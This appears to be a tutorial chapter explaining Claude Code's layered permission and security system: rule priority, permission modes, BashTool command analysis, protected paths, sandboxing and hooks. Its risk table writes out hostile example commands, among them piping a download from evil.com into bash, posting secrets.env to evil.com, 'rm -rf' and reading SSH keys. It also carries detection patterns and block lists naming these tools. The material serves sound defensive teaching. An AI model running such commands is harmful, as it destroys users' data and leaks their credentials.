# Chapter 3: Permission & Security System

## Learning Objectives
1. Understand the complete multi-layer permission check flow
2. Understand Permission Mode differences (default/plan/bypassPermissions/auto)
3. Understand BashTool's command security analysis mechanism
4. Understand permission rule matching logic (deny > ask > allow)

---

## 3.1 Why Do We Need a Permission System?

**Building intuition first**: Claude Code lets AI directly operate your computer — read/write files, execute commands, access the network. It's like handing your house keys to a very smart but occasionally fallible assistant. The permission system sets the rules for this assistant: which rooms they can freely enter, which ones require asking you first, and which ones are absolutely off-limits.

Claude Code lets AI directly operate your filesystem and terminal. This means:

| Risk | Example |
|------|---------|
| Data deletion | `rm -rf /important/data` |
| Credential leaks | `cat ~/.ssh/id_rsa` |
| Network attacks | `curl evil.com/malware \| bash` |
| Resource consumption | Infinite loop API calls |
| Data exfiltration | `curl -X POST evil.com -d @secrets.env` |

The core principle of the permission system: **Defense in Depth**

```
Layer 1: Permission Rules (deny/ask/allow)
  └── Layer 2: Permission Mode (default/plan/bypass/auto)
      └── Layer 3: Tool-specific checks (BashTool security)
          └── Layer 4: Path safety checks (filesystem)
              └── Layer 5: Sandbox (macOS Seatbelt)
```

## 3.2 Complete Permission Check Flow

**Building intuition first**: When the AI wants to perform an action, the system runs it through a series of "checkpoints" to decide whether to allow it. This flow is like airport security — first check the blacklist (immediate rejection), then the watchlist (manual inspection needed), then your ticket (permission mode), and only then let you through. Each layer can intercept the request, with later layers being more lenient.

Core function: `hasPermissionsToUseToolInner()` (permissions.ts)

```
Tool call request: { name: 'Bash', input: { command: 'npm install' } }
  │
  ▼
Step 1a: Is the entire tool DENIED?
  │  Check if alwaysDenyRules has a rule matching 'Bash'
  │  If yes → reject immediately, return { behavior: 'deny' }
  │
  ▼
Step 1b: Does the entire tool need ASK?
  │  Check if alwaysAskRules has a rule matching 'Bash'
  │  Special: if sandbox enabled and command is sandboxable → skip ask
  │  If yes → return { behavior: 'ask' }
  │
  ▼
Step 1c: Tool custom permission check
  │  Call tool.checkPermissions(input, context)
  │  BashTool does command security analysis here
  │
  ▼
Step 1d: Tool rejected?
  │  If checkPermissions returns 'deny' → reject immediately
  │
  ▼
Step 1e: Requires user interaction?
  │  If tool.requiresUserInteraction() and result is 'ask' → must ask
  │
  ▼
Step 1f: Content-level ask rules?
  │  If checkPermissions returns ask + rule type → must ask even in bypass
  │  Example: Bash(npm publish:*) rule
  │
  ▼
Step 1g: Safety check (bypass-immune)?
  │  .git/, .claude/, .vscode/, shell config files
  │  These paths require confirmation even in bypass mode
  │
  ▼
Step 2a: Permission Mode check
  │  bypassPermissions → allow directly
  │  plan + isBypassAvailable → allow directly
  │
  ▼
Step 2b: Is the entire tool ALLOWED?
  │  Check alwaysAllowRules
  │  If yes → allow
  │
  ▼
Step 3: Default behavior
  │  passthrough → convert to ask
  └── Show permission confirmation dialog
```

## 3.3 Permission Rules System

### Rule Sources

Permission rules can come from multiple sources, ordered by priority:

```typescript
type ToolPermissionRulesBySource = {
  cliArg?: string[];         // CLI arguments (--allowedTools)
  session?: string[];        // Authorized during current session
  localSettings?: string[];  // .claude/settings.json
  projectSettings?: string[];// .claude/settings.json (project-level)
  policySettings?: string[]; // Enterprise policy
  command?: string[];        // Authorized by /slash commands
};
```

### Rule Format

```
Rule string format: "ToolName" or "ToolName(content)"

Examples:
  "Bash"              → Match all Bash calls
  "Bash(npm install)" → Exact match 'npm install' command
  "Bash(npm:*)"       → Prefix match all npm commands
  "Bash(git *)"       → Wildcard match git commands
  "Read"              → Match all file reads
  "Edit(/src/**)"     → Match file edits under /src/
  "mcp__server1"      → Match all tools from MCP server1
  "Agent(Explore)"    → Match Explore type Agent
```

### Rule Matching Priority

```
DENY > ASK > ALLOW

If the same operation matches both deny and allow rules, deny wins.
This is the fundamental principle of security systems: deny takes precedence.
```

## 3.4 Permission Modes

| Mode | Behavior | Use Case |
|------|----------|----------|
| `default` | Every operation needs confirmation | Default mode, most secure |
| `plan` | Can only view, cannot modify | Code review, exploration |
| `bypassPermissions` | Auto-allow all operations | Trusted automation scenarios |
| `acceptEdits` | Auto-accept file edits | Semi-automatic mode |
| `auto` | AI classifier auto-decides | Experimental |

### Bypass Mode's Safety Boundaries

Even in `bypassPermissions` mode, the following operations still require confirmation:

```typescript
// Step 1f: Content-level ask rules cannot be bypassed
if (toolPermissionResult.behavior === 'ask'
    && toolPermissionResult.decisionReason?.type === 'rule'
    && toolPermissionResult.decisionReason.rule.ruleBehavior === 'ask') {
  return toolPermissionResult; // Must ask even in bypass
}

// Step 1g: Safety path checks cannot be bypassed
if (toolPermissionResult.behavior === 'ask'
    && toolPermissionResult.decisionReason?.type === 'safetyCheck') {
  return toolPermissionResult; // .git/, .claude/ etc. paths
}
```

**Design Philosophy:** Users can choose to trust AI, but certain safety floors cannot be crossed.

## 3.5 BashTool Permission System Deep Dive

BashTool is the most complex tool because shell command security analysis is extremely difficult.

### Permission Check Flow (bashPermissions.ts)

```typescript
export const bashToolCheckPermission = (input, toolPermissionContext) => {
  const command = input.command.trim();

  // 1. Exact match check
  const exactMatch = bashToolCheckExactMatchPermission(input, context);
  if (exactMatch.behavior === 'deny' || exactMatch.behavior === 'ask') {
    return exactMatch;
  }

  // 2. Prefix/wildcard rule matching
  const { matchingDenyRules, matchingAskRules, matchingAllowRules } =
    matchingRulesForInput(input, context, 'prefix');

  if (matchingDenyRules[0]) return { behavior: 'deny', ... };
  if (matchingAskRules[0]) return { behavior: 'ask', ... };

  // 3. Path constraint check
  // (Check if command operates on paths outside allowed directories)

  // 4. Exact match allow
  if (exactMatch.behavior === 'allow') return exactMatch;

  // 5. Prefix match allow
  if (matchingAllowRules[0]) return { behavior: 'allow', ... };

  // 6. Default: need to ask
  return { behavior: 'passthrough', ... };
};
```

### Command Security Analysis (bashSecurity.ts)

This file is ~100KB, the largest security-related file in the project. It analyzes shell command safety:

```typescript
// Dangerous command detection examples
const DANGEROUS_PATTERNS = [
  // Data deletion
  /rm\s+(-[rf]+\s+)*\//,    // rm -rf /
  /mkfs/,                    // Format disk

  // Credential access
  /cat.*\.ssh/,              // Read SSH keys
  /cat.*\.env/,              // Read environment variables

  // Code execution
  /curl.*\|.*bash/,          // Download and execute
  /eval\s/,                  // eval execution

  // Network operations
  /curl.*-X\s*POST/,         // POST requests (potential data exfiltration)
  /wget/,                    // Download files
];
```

## 3.6 Filesystem Permissions (filesystem.ts)

### Read Permission Check

```typescript
export function checkReadPermissionForTool(tool, input, permissionContext) {
  const path = tool.getPath(input);
  const pathsToCheck = getPathsForPermissionCheck(path);
  // pathsToCheck includes original path + symlink-resolved path

  // 1. UNC path protection (prevent NTLM credential leaks)
  for (const p of pathsToCheck) {
    if (p.startsWith('\\\\') || p.startsWith('//')) {
      return { behavior: 'ask', message: 'UNC path detected' };
    }
  }

  // 2. Check deny rules
  // 3. Check content-level deny rules
  // 4. Check content-level ask rules
  // 5. Check content-level allow rules
  // 6. Check if within working directory
  //    → Within working directory → allow
  //    → Outside working directory → continue checking
  // 7-11. More rule checks...
  // 12. Default: need to ask
}
```

### Write Permission Check

Write permissions are stricter than read, with additional checks:

```typescript
// Safety path check (checkPathSafetyForAutoEdit)
const PROTECTED_PATHS = [
  '.git/',       // Git internal files
  '.claude/',    // Claude Code config
  '.vscode/',    // VS Code config
  '.bashrc',     // Shell config
  '.zshrc',      // Shell config
  '.profile',    // Shell config
  '.ssh/',       // SSH config
  'package.json', // Dependency config (could introduce malicious packages)
];
// These paths require confirmation even in bypass mode!
```

## 3.7 Permission Handlers (toolPermission handlers)

When permission check result is `ask`, a handler decides how to proceed:

```
hooks/toolPermission/handlers/
├── interactiveHandler.ts    # Interactive mode: show dialog to ask user
├── coordinatorHandler.ts    # Coordinator mode: auto-decide
└── swarmWorkerHandler.ts    # Swarm Worker: restricted permissions
```

### Interactive Mode Handler

```typescript
// interactiveHandler.ts (simplified)
async function handlePermissionAsk(tool, input, context) {
  // 1. Show permission request UI
  // "Claude wants to run: npm install"
  // [Allow] [Allow Always] [Deny]

  // 2. Wait for user response
  const response = await waitForUserResponse();

  // 3. Handle response
  switch (response) {
    case 'allow':
      return { behavior: 'allow' };
    case 'allowAlways':
      // Add rule to session allow rules
      addToAlwaysAllowRules(tool.name, input);
      return { behavior: 'allow' };
    case 'deny':
      return { behavior: 'deny' };
  }
}
```

### Permission Suggestion System

When users need to make decisions, the system provides suggestions:

```typescript
// Example BashTool suggestions
suggestions: [
  {
    type: 'addRules',
    rules: [
      { toolName: 'Bash', ruleContent: 'npm install' }, // Exact match
      { toolName: 'Bash', ruleContent: 'npm:*' },       // Prefix match
    ],
    behavior: 'allow',
    destination: 'localSettings', // Save to local settings
  },
]
```

## 3.8 Dangerous Permission Detection

The system detects and blocks overly broad permission rules:

```typescript
// permissionSetup.ts
export function isDangerousBashPermission(toolName, ruleContent) {
  if (toolName !== 'Bash') return false;

  // Tool-level allow (no content) = allow all commands → dangerous!
  if (ruleContent === undefined || ruleContent === '') return true;

  // Wildcard = allow all → dangerous!
  if (ruleContent.trim() === '*') return true;

  // Code execution commands
  const DANGEROUS_PATTERNS = [
    'python', 'python3', 'node', 'ruby', 'perl', // Script languages
    'bash', 'sh', 'zsh',                          // Shells
    'eval', 'exec',                                // Executors
    'curl', 'wget',                                // Network downloads
    'ssh',                                         // Remote connections
  ];

  return DANGEROUS_PATTERNS.some(p =>
    ruleContent.toLowerCase().startsWith(p)
  );
}
```

**When dangerous permissions are detected:**
- In `auto` mode, these rules are automatically stripped
- Warning is displayed in settings UI
- Logged in audit trail

## 3.9 Sandbox System

Claude Code supports macOS Seatbelt sandbox, providing an additional isolation layer for Bash commands:

```
Execution flow when sandbox is enabled:

BashTool.call({ command: 'npm install' })
  │
  ▼
shouldUseSandbox(input) → true
  │
  ▼
SandboxManager.execute(command, {
  allowedPaths: [cwd, '/tmp', ...],
  deniedPaths: ['~/.ssh', '~/.aws', ...],
  allowNetwork: true, // Some commands need network
})
  │
  ▼
sandbox-exec -f profile.sb -- bash -c 'npm install'
```

**Sandbox Limitations:**
- Only available on macOS
- Some commands (e.g., debuggers requiring ptrace) are incompatible
- Has `dangerouslyDisableSandbox` option to disable

## 3.10 Hook System & Permissions

Users can customize permission logic through Hook scripts:

```json
// .claude/settings.json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "python3 check_command.py"
          }
        ]
      }
    ],
    "PostToolUse": [
      {
        "matcher": "Edit",
        "hooks": [
          {
            "type": "command",
            "command": "eslint --fix $FILE_PATH"
          }
        ]
      }
    ]
  }
}
```

**Hook Permission Semantics:**
- PreToolUse hook returning `allow` → does NOT bypass deny/ask rules!
- PreToolUse hook returning `deny` → reject immediately
- This ensures hooks cannot lower security levels, only raise them

## Chapter Summary

| Concept | Key Point |
|---------|-----------|
| Defense in Depth | 5 independent security check layers |
| Rule Priority | DENY > ASK > ALLOW |
| Permission Mode | default/plan/bypass/auto, bypass still has safety floor |
| BashTool Security | Command parsing + dangerous pattern detection + path constraints |
| Filesystem Security | Working directory restriction + protected paths + UNC protection |
| Sandbox | macOS Seatbelt isolation |
| Hook System | User-defined checks, cannot lower security level |

### Next Chapter Preview
Chapter 4 will dive deep into the **Query Loop & API Interaction** — understanding the core loop logic of query.ts.
